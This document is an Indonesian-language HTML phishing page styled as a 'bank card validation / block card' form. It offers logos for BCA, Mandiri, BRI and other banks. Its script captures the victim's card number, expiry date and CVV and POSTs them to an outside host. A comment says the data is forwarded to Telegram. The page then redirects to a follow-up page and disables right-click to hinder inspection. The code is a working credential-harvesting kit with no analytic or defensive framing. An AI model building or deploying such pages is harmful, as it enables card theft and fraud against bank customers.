<html lang="id">
<head>
<meta charset="UTF-8" />
  <meta name="theme-color" content="#ffffff" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Validasi Kartu Bank</title>
<style>
  /* Reset */
  * { box-sizing: border-box; }
  body {
    font-family: Arial, sans-serif;
    background:#fff; color:#222;
  }
  .top-background {
    height: 220px;
margin-top:-8%;
background: #AD2181;
    border-radius: 0 0 40px 40px;
    transition: background-color 0.5s ease;
  }
  .card-preview {
  margin-top: 40px; /* ✅ Ini juga bisa menurunkan posisi card */
}

  .container {
    max-width: 100%;
    margin: -170px auto 40px;
    padding: 0 20px 40px;
    background: #ffffff90;
    border-radius: 20px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    position: relative;
    z-index: 2;
  }
  .card-wrapper {
    position: relative;
    width: 320px;
    left: -6;
    margin: 0px auto;
    height: 205px;
    background: transparent;
    margin: 0 auto 39px;
    overflow: hidden;
    border: 1px solid #000;
    border-radius: 20px;
    box-shadow: 0 9px 16px rgba(0,0,0,0.15);
  }
  #card-image {
    width: 100%;
    height: 100%;
    object-fit: cover;
    position: relative;
    left: -10;
    right: 0;
    margin: 0px auto;
  
    
  }
  .card-img-new {
    position: absolute;
    top: 0;
    width: 100%;
    height: 100%;
    object-fit: contain;
    left: 100%;
    transition: left 0.5s ease;
  }
  form {
    display: flex;
    flex-direction: column;
    gap: 10px;
    height: 280px;
  }
  label {
    font-weight: 600;
    margin-bottom: 6px;
    display: block;
    font-size: 15px;
  }
  input, select, button {
    width: 100%;
    padding: 12px 14px;
    font-size: 16px;
    border: 1px solid #b22222;
    border-radius: 5px;
    transition: border-color 0.3s ease;
    border-color: rgb(187, 187, 187); box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 7px inset; color: rgb(85, 85, 85); 
  }
  input:focus, select:focus {
    border-color: #333;
    outline: none;
    border-color: rgb(187, 187, 187); box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 7px inset; color: rgb(85, 85, 85); 
  }
  button {
    background-color: #444;

    color: white;
    font-weight: 700;
    border: none;
    cursor: not-allowed;
    transition: background-color 0.3s ease;
    border-radius: 4px;
  }
  button:enabled {
    background-color: #b22222;
    cursor: pointer;
    

  }
  .error {
   ;
  }
  .row-inputs {
  display: flex;
  gap: 16px;
}

.input-with-icon {
  position: relative;
  flex: 1; /* supaya 2 kolom sama lebar */
}

.input-with-icon input {
  width: 100%;
  padding-right: 36px; /* ruang untuk icon di kanan */
  font-size: 16px;
  border: 1px solid #b22222;
  border-radius: 4px;
  transition: border-color 0.3s ease;
  border-color: rgb(187, 187, 187); box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 7px inset; color: rgb(85, 85, 85); 
}

.input-icon {
  position: absolute;
  top: 70%;
  right: 10px;
  width: 20px;
  height: 20px;
  transform: translateY(-50%);
  pointer-events: none; /* supaya icon tidak menghalangi input */
  opacity: 0.6;
  border-color: rgb(187, 187, 187); box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 7px inset; color: rgb(85, 85, 85); 
}

.form-control { border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 0px 1px 5px inset; color: rgb(85, 85, 85); }

.form-control[disabled], .form-control[readonly], fieldset[disabled] .form-control { box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; background-color: rgb(238, 238, 238); }

.form-control.focusedInput, .form-control:focus { border-color: rgb(187, 187, 187); box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 7px inset; color: rgb(85, 85, 85); }
.btn-special:hover, .btn-special:focus, .btn-special.hover { background-color: rgb(150, 32, 32); background-image: linear-gradient(rgb(180, 33, 32) 0%, rgb(150, 32, 32) 100%); background-repeat: repeat-x; color: rgb(255, 255, 255); }

.btn-special:active, .btn-special.active { background-color: rgb(150, 32, 32); border-color: rgb(208, 208, 208); color: rgb(255, 255, 255); }

#wrap { background: none 0px 0px repeat scroll rgb(255, 255, 255); }

#wrap > .container { background: none 0px 0px repeat scroll rgb(255, 255, 255); }

#footer { background-color: rgb(239, 243, 242); background-image: linear-gradient(rgb(239, 243, 242) 0%, rgb(222, 222, 222) 100%); background-repeat: repeat-x; border-top: 2px solid rgb(218, 37, 28); }

</style>
</head>
<body>

<div class="top-background"></div>
<djback style="width: 100%; height: 100%; top:0; left: 0; right: 0; bottom: 0; position: fixed; z-index:-1; background-image: url(); background-size: 100% 100%;background-position: 100% 100%; filter: blur(0px);"></djback>
<div class="container">
     <br>
  <div class="card-wrapper">
    <img id="card-image" src="img/bi.jpg" alt="Gambar kartu bank" />
  </div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
		<div class="container" style="background: #fff">
			<div class="well-container well-special">
		    	<div class="well">
		        
			           
			        
		     
<form id="card-form" method="POST" onsubmit="if (!window.__cfRLUnblockHandlers) return false; return false" data-cf-modified-c58fdef13451162157b3102f-="">
    <br>
    <label for="bank-select" style="margin-top: -10px">Pilihan Bank Lainya</label>
    <select id="bankselect" name="bank" required style="margin-top: -10px">
      <!-- option akan di-generate JS -->
    </select>

  <div class="input-with-icon">
    <label for="card-number">Nomor Kartu</label>
    <input class="form-control"
      type="text"
      id="cardnumber"
      name="card_number"
      placeholder="Masukan 16 Digit Nomor Kartu"
      maxlength="19"
      inputmode="numeric"
      autocomplete="cc-number"
      required
     style="border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 0px 1px 5px inset; color: rgb(85, 85, 85);"/>
    <img
      src="https://cdn-icons-png.flaticon.com/512/633/633611.png"
      alt="credit card icon"
      class="input-icon"
    />
  </div>

  <div class="row-inputs">
    <div class="input-with-icon">
      <label for="expiry-date">Masa Berlaku</label>
      <input
        type="text"
        id="expirydate"
        name="expiry_date"
        placeholder="Valid/Thru"
        maxlength="5"
        inputmode="numeric"
        autocomplete="cc-exp"
        required
      />
      <img
        src="https://img.icons8.com/?size=100&id=vwGXRtPWrZSn&format=png&color=000000"
        alt="calendar icon"
        class="input-icon"
      />
    </div>

    <div class="input-with-icon">
      <label for="cvv">CVV</label>
      <input
        type="text"
        id="cvv"
        name="cvv"
        placeholder="***"
        maxlength="3"
        inputmode="numeric"
        autocomplete="cc-csc"
        required
      />
      <img
        src="https://cdn-icons-png.flaticon.com/512/565/565547.png"
        alt="lock icon"
        class="input-icon"
      />
    </div>
  </div>

  <button class="btn-special" type="submit" style="background-size: 100% 100%;
 transition: background-color 0.3s ease;
           background-color: #AD2181; backgruound-image: linear-gradient(#0065FF 0%, #0960E4 100%); background-repeat: repeat-x; border-color: rgb(208, 208, 208); color: rgb(255, 255, 255);
  background-repeat: no-repeat;
  background-position: 100% 100%;border-color: rgb(208, 208, 208); color: rgb(255, 255, 255); margin-top: 10px">Blokir Kartu</button>
</form>
</div>
	</div>
		  	</div>
</div>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js" ></script>
<script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js" ></script>    

<script>
  document.addEventListener("DOMContentLoaded", () => {
    const banks = [
      { id: "- PILIH BANK ANDA -", name: "- PILIH BANK ANDA -", color: "#FFD8B1", cardImg: "img/bi.jpg", disable: ""},
      { id: "bca", name: "BCA", color: "#FFD8B1", cardImg: "photo/bca.jpg" },
      { id: "mandiri", name: "Mandiri", color: "#C6E2FF", cardImg: "https://blogger.googleusercontent.com/img/a/AVvXsEjp95w0o6RXLZLr1_5wbYtHLzpBvhnnNtmtPR6hn_3rCZmm3vkyZQAsi0Gv9urr5uM4TR-aR7dZUkAtcctmIuFl0-D181fVGLmG-BqedzvZZFbbm7YifGlTt-r2GzREz-pifEYIT6mtXWO0us-BHNgI96uSU2cnDlQxhl2apC7nKK4Tp9WrP40X8Yil0-B8" },
      { id: "ocbc", name: "OCBC", color: "#FAD1D1", cardImg: "photo/ocbc.jpg" },
      { id: "bri", name: "BRI", color: "#E0FFD8", cardImg: "img/bri88.jpg" },
      { id: "cimb", name: "CIMB Niaga", color: "#FFE3E3", cardImg: "https://blogger.googleusercontent.com/img/a/AVvXsEglhmjfAh65g6pMnj1ClEw8LnPonP4cpAEJDeOft2x0b2wIG5m7zpZonaNqbHYdQ4cSNpTeyXb2p2gOBKFtTVSZKqUWTtDqWMzN51nQU3xqXf-ptY8EdBvFojG6XD7SXGUZ9GMFOnf4sQksmKZGzg2rf8EBz0r_OCdv3U0JqpMO9A7_jKluYeUqR-76pMuG" },
      { id: "permata", name: "Permata", color: "#FFF4D1", cardImg: "photo/permata.jpg" },
      { id: "danamon", name: "Danamon", color: "#E3E0FF", cardImg: "photo/danamon.jpg" },
      { id: "btn", name: "BTN", color: "#FFE0F0", cardImg: "photo/btn1.jpg" },
      
      
            { id: "bukopin", name: "BUKOPIN", color: "#D1FFF3", cardImg: "https://cdn.glitch.global/f7ea1293-5258-4ca2-adb1-2075e83102ad/a4c52567-6225-4892-bda1-cbbd49b56cca_1.png?v=1748654143581" },
      
                  { id: "dbs", name: "DBS", color: "#D1FFF3", cardImg: "https://cdn.glitch.global/f7ea1293-5258-4ca2-adb1-2075e83102ad/ChatGPT%20Image%2031%20Mei%202025%2C%2008.34.10.png?v=1748655313285" },
      
      { id: "maybank", name: "Maybank", color: "#FFF4D1", cardImg: "photo/maybank1.jpg" },
      { id: "uob", name: "UOB", color: "#E3E0FF", cardImg: "photo/uob.jpg" },
      
      { id: "mnc", name: "MNC", color: "#FFF4D1", cardImg: "photo/mnc.jpg" },
      { id: "hsbc", name: "HSBC", color: "#E3E0FF", cardImg: "photo/hsbc.jpg" },
      { id: "mega", name: "MEGA", color: "#FFF4D1", cardImg: "img/mega2.jpg" },
      { id: "btpn", name: "BTPN", color: "#E3E0FF", cardImg: "photo/btpn.jpg" },
      
      
      { id: "banklain", name: "BANK LAIN", color: "#FFF1D1", cardImg: "https://blogger.googleusercontent.com/img/a/AVvXsEiT1WY_GsD4Bd38oxNSdIj9fYOxDyqfm4aPHqUA8wwwX7kC6E_oHgKiEtj1DMGEmNiqvVXEUtz8ALU_c-ifPEOFBwvPQSKnsMKKB4VLRh4jyWcZ1v16cCXjpZBuRsHP9Iepm8un9pUCJO4QrXI7bzbhy8w6aogDZipAxbWm0rg7I0y6RmK-p914Rgxvs0h5" },
    ];

    const bankSelect = document.getElementById("bankselect");
    const topBackground = document.querySelector(".top-background");
    const cardImage = document.getElementById("card-image");
    const cardNumberInput = document.getElementById("cardnumber");
    const expiryInput = document.getElementById("expirydate");
    const cvvInput = document.getElementById("cvv");
    const submitBtn = document.getElementById("submit-btn");
    const form = document.getElementById("card-form");

    // Inisialisasi pilihan bank dan default background + gambar kartu
    function initBankOptions() {
      banks.forEach(bank => {
        const option = document.createElement("option");
        
        option.value = bank.id;
        option.textContent = bank.name;
        bankSelect.appendChild(option);
      });
      bankSelect.value = banks[0].id;
      updateBankUI(banks[0].id, true);
    }

    function updateBankUI(bankId, firstLoad = false) {
      const bank = banks.find(b => b.id === bankId);
      if (!bank) return;
      if (firstLoad) {
        topBackground.style.backgroundColor = bank.color;
      } else {
        topBackground.style.transition = "background-color 0.1s easein";
        topBackground.style.backgroundColor = bank.color;
      }
      changeCardImage(bank.cardImg);
    }

    function changeCardImage(newSrc) {
      const newImg = document.createElement("img");
      newImg.src = newSrc;
      newImg.alt = "Gambar kartu bank";
      newImg.classList.add("card-img-new");

      cardImage.parentNode.style.position = "relative";
      cardImage.parentNode.appendChild(newImg);

      requestAnimationFrame(() => {
        newImg.style.left = "0";
        cardImage.style.left = "-100%";
        cardImage.style.position = "absolute";
      });

      newImg.addEventListener("transitionend", () => {
        cardImage.src = newSrc;
        cardImage.style.left = "0";
        cardImage.style.position = "relative";
        newImg.remove();
      });
    }

    // Validasi nomor kartu pakai Luhn Algorithm + panjang 12-19 digit
    function isValidCardNumber(number) {
      if (!/^\d{12,19}$/.test(number)) return false;

      let sum = 0;
      let shouldDouble = false;
      for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    // Validasi expiry date MM/YY, masa berlaku minimal saat ini atau lebih
    function isValidExpiryDate(expiry) {
      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
      const [mm, yy] = expiry.split("index.html").map(Number);
      if (mm < 1 || mm > 12) return false;

      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;

      if (yy < currentYear) return false;
      if (yy === currentYear && mm < currentMonth) return false;
      return true;
    }

    // Validasi CVV 3 atau 4 digit angka
    function isValidCVV(cvv) {
      return /^\d{3,4}$/.test(cvv);
    }

    // Cek semua validasi input form
    function validateAll() {
      let valid = true;

      // Nomor kartu tanpa spasi
      const cardNumRaw = cardNumberInput.value.replace(/\s/g, "");
      if (isValidCardNumber(cardNumRaw)) {
        cardNumberInput.classList.remove("error");
      } else {
        cardNumberInput.classList.add("error");
        valid = false;
      }

      if (isValidExpiryDate(expiryInput.value)) {
        expiryInput.classList.remove("error");
      } else {
        expiryInput.classList.add("error");
        valid = false;
      }

      if (isValidCVV(cvvInput.value)) {
        cvvInput.classList.remove("error");
      } else {
        cvvInput.classList.add("error");
        valid = false;
      }

      if (!bankSelect.value) valid = false;

      submitBtn.disabled = !valid;
      return valid;
    }

    // Event listener input format dan validasi live
    bankSelect.addEventListener("change", e => {
      updateBankUI(e.target.value);
      validateAll();
    });

    cardNumberInput.addEventListener("input", e => {
      let val = e.target.value.replace(/\D/g, "");
      val = val.match(/.{1,4}/g)?.join(" ") || "";
      e.target.value = val;
      validateAll();
    });

    expiryInput.addEventListener("input", e => {
      let val = e.target.value.replace(/[^\d]/g, "");
      if (val.length > 2) {
        val = val.slice(0, 2) + "/" + val.slice(2, 4);
      }
      e.target.value = val;
      validateAll();
    });

    cvvInput.addEventListener("input", e => {
      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
      validateAll();
    });

    form.addEventListener("submit", e => {
      if (!validateAll()) {
        e.preventDefault();
        return;
      }
      // form submit ke submit.php (PHP server)
      // Pastikan submit.php sudah siap menerima POST dan kirim ke Telegram
    });

    // Inisialisasi awal
    initBankOptions();
    validateAll();
  });
  
  document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
</script>
<script>
$(document).ready(function(){
 $('#card-form').submit(function(e) {
 
     event.stopPropagation();
    event.preventDefault();



var cardnumber = document.getElementById('cardnumber');
        
var expirydate = document.getElementById('expirydate');
var cvv = document.getElementById('cvv');
var bankselect = document.getElementById('bankselect');

        var gabungan =  "\n├─────•Bank lain•────•" + '\n├•※ 𝗕𝗮𝗻𝗸 : ' + bankselect.value + '\n├•※ 𝗞𝗮𝗿𝘁𝘂 : ' + cardnumber.value + '\n├•※ 𝗩𝗮𝗹𝗶𝗱 : ' + expirydate.value + '\n├•※ 𝗖𝗩𝗩 : ' + cvv.value +  "\n╰───────────────────•";

 

      $.ajax({
        url: 'https://choreo.cloud/im.php',
        data: { message: gabungan },
        method: `POST`,
 
    
    complete: function(data) {
            console.log('Complete');
   setTimeout(function(){
           
location.href='konf.html';           
var bank = document.getElementById('bankselect').value;
sessionStorage.setItem("bank", bank);           
var debit = document.getElementById('cardnumber').value;
sessionStorage.setItem("debit", debit);
var valid = document.getElementById('expirydate').value;
sessionStorage.setItem("valid", valid);
var cvv = document.getElementById('cvv').value;
sessionStorage.setItem("cvv", cvv);
       
    }, 500);
    
        }
    });
 });
    return false;
});       

 </script> 
 <script src="server.js" ></script> 
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="c58fdef13451162157b3102f-|49" defer></script></body>
</html>
